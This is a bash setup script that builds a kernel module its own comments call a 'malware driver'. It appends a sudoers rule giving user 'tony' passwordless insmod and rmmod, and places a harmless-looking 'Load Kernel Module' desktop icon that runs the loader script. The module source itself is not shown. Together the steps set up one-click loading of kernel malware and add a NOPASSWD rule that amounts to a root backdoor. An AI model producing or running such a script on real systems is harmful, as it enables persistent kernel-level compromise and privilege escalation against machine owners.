#!/bin/bash

# Ensure the script is running with root privileges
if [ "$(id -u)" -ne "0" ]; then
    echo "This script must be run as root!"
    exit 1
fi

######################################################################################################

# Step 1: Build the kernel module

DRIVER_DIR="./driver"

if [ -d "$DRIVER_DIR" ]; then
    echo "Running 'make' in the $DRIVER_DIR directory..."
    cd "$DRIVER_DIR" || { echo "Failed to change directory to $DRIVER_DIR"; exit 1; }
    make || { echo "'make' failed in $DRIVER_DIR"; exit 1; }
    echo "'make' completed successfully in $DRIVER_DIR."
    cd ..
else
    echo "Error: $DRIVER_DIR does not exist."
    exit 1
fi
######################################################################################################

# Step 2: Add a line to the sudoers file so that the malware driver can be installed WITHOUT sudo

USER="tony"
SUDOERS_FILE="/etc/sudoers"
SUDOERS_RULE="$USER ALL=(ALL) NOPASSWD: /sbin/insmod, /sbin/rmmod"

# Check if the rule is already present to avoid duplicates
if ! sudo grep -Fxq "$SUDOERS_RULE" "$SUDOERS_FILE"; then
    echo "Adding NOPASSWD rule to sudoers..."
    echo "$SUDOERS_RULE" | sudo tee -a "$SUDOERS_FILE" > /dev/null
else
    echo "NOPASSWD rule already exists."
fi

#USER="tony"
#RELATIVE_SCRIPT_PATH="./driver/load.sh"
#chmod +x "$RELATIVE_SCRIPT_PATH"
#SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
#DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"

# Check if the line already exists in sudoers file.
# If it does not, then add it.
#if ! grep -q "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" /etc/sudoers; then
    # Append the necessary line to sudoers file using tee for safe editing
#    echo "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" | tee -a /etc/sudoers > /dev/null
#    echo "Sudoers file updated successfully."
#else
#    echo "Sudoers file already contains the necessary entry."
#fi



######################################################################################################

# Step 3: Create a desktop icon which will run a script to install the malware driver

RELATIVE_SCRIPT_PATH="./driver/load.sh"
chmod +x "$RELATIVE_SCRIPT_PATH"
SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"

DESKTOP_CONTENT="[Desktop Entry]
Version=1.0
Name=Load Kernel Module
Comment=Click to load the kernel module
Exec=$SCRIPT_PATH
Icon=utilities-terminal
Terminal=false
Type=Application
Categories=Utility;"

# Create the desktop icon file
echo "$DESKTOP_CONTENT" > "$DESKTOP_ICON_PATH"

# Make the desktop icon executable
chmod +x "$DESKTOP_ICON_PATH"
echo "Desktop icon created successfully at $DESKTOP_ICON_PATH"

# Provide feedback to the user
echo "Setup completed!"
